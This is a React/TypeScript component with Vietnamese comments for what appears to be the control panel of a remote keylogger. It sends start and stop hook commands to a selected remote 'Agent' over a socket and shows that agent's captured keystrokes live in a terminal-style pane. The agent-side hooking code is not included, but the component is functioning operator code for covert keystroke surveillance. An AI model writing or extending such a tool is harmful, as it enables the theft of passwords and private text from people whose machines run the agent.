// file: KeyloggerCard.tsx

// 1. Chỉ import useState và useEffect
import React, { useState, useEffect } from 'react';
// 2. Xóa RefreshCw
import { Keyboard, Play, Square } from 'lucide-react';

import { useSocket } from '../contexts/SocketContext';
import { sendCommand } from '../services/socketService';

export default function KeyloggerCard() {
    const [isLogging, setIsLogging] = useState(false);
    const [logs, setLogs] = useState<string>("");
    const [isLoading, setIsLoading] = useState(false);

    // 3. LẤY 'socket' TỪ CONTEXT
    const { selectedAgentId, socket } = useSocket();

    // 4. (Giữ nguyên) handleStartLogging
    const handleStartLogging = async () => {
        if (!selectedAgentId) return alert('Vui lòng chọn một Agent trước.');
        setIsLoading(true);
        try {
            await sendCommand(selectedAgentId, 'keylog_start_hook');
            setIsLogging(true);
            // Sửa lại tin nhắn
            setLogs("Đã bắt đầu theo dõi real-time...\n");
        } catch (err: any) {
            alert(`Lỗi khi bắt đầu: ${err.message}`);
        }
        setIsLoading(false);
    };

    // 5. (Giữ nguyên) handleStopLogging
    const handleStopLogging = async () => {
        if (!selectedAgentId) return alert('Vui lòng chọn một Agent trước.');
        setIsLoading(true);
        try {
            await sendCommand(selectedAgentId, 'keylog_stop_unhook');
            setIsLogging(false);
            // Thêm dòng mới cho đẹp
            setLogs(prev => prev + "\nĐã dừng theo dõi.");
        } catch (err: any) {
            alert(`Lỗi khi dừng: ${err.message}`);
        }
        setIsLoading(false);
    };

    // 6. XÓA BỎ: handlePrintLogs

    // 7. THÊM MỚI: Lắng nghe sự kiện 'keylog_data'
    useEffect(() => {
        // Chỉ lắng nghe khi có socket, đang logging, và đã chọn agent
        if (!socket || !isLogging || !selectedAgentId) return;

        // Sửa hàm xử lý:
        // 'data' bây giờ là đối tượng { agentId: string, key: string }
        const handleKeyData = (data: { agentId: string, key: string }) => {

            // Chỉ cập nhật log NẾU phím này đến từ agent đang chọn
            if (data.agentId === selectedAgentId) {
                setLogs(prevLogs => prevLogs + data.key);
            }
        };

        // Đăng ký lắng nghe sự kiện
        socket.on('keylog_data', handleKeyData);

        return () => {
            socket.off('keylog_data', handleKeyData);
        };

        // Thêm selectedAgentId vào dependencies
    }, [socket, isLogging, selectedAgentId]);

    // 8. (Giữ nguyên) Tự động xóa log khi đổi Agent
    useEffect(() => {
        setLogs("");
        setIsLogging(false);
    }, [selectedAgentId]);


    return (
        <div className="bg-white rounded-lg shadow-md p-6">
            <h3 className="text-lg font-bold text-gray-800 mb-4 flex items-center gap-2">
                <Keyboard className="w-5 h-5" />
                Keylogger (Real-time) {/* Sửa tiêu đề */}
            </h3>

            <div className="flex gap-2 mb-4">
                {/* (Nút Start) */}
                <button
                    onClick={handleStartLogging}
                    disabled={isLogging || isLoading || !selectedAgentId}
                    className="flex-1 flex items-center justify-center gap-2 px-4 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 transition-colors disabled:bg-gray-400 disabled:cursor-not-allowed"
                >
                    <Play className="w-4 h-4" />
                    Start Logging
                </button>
                {/* (Nút Stop) */}
                <button
                    onClick={handleStopLogging}
                    disabled={!isLogging || isLoading || !selectedAgentId}
                    className="flex-1 flex items-center justify-center gap-2 px-4 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 transition-colors disabled:bg-gray-400 disabled:cursor-not-allowed"
                >
                    <Square className="w-4 h-4" />
                    Stop Logging
                </button>
            </div>

            {/* 9. XÓA BỎ: Nút "Làm mới Logs" */}

            {/* Màn hình terminal */}
            <div
                className="bg-gray-900 rounded-lg p-4 h-[300px] overflow-y-auto font-mono text-sm"
            >
                {/* 10. Logic hiển thị log vẫn giữ nguyên, nó sẽ tự update */}
                {logs.length === 0 ? (
                    <p className="text-gray-500">
                        {!selectedAgentId ? "Vui lòng chọn một Agent." : "Bấm 'Start Logging' để bắt đầu..."}
                    </p>
                ) : (
                    <pre className="text-green-400 whitespace-pre-wrap">
                        {logs}
                    </pre>
                )}
            </div>

            {/* (Phần 'Logging active' giữ nguyên) */}
            {isLogging && (
                <div className="mt-2 text-sm text-green-600 flex items-center gap-2">
                    <span className="w-2 h-2 bg-green-600 rounded-full animate-pulse"></span>
                    Logging active on Agent
                </div>
            )}
        </div>
    );
}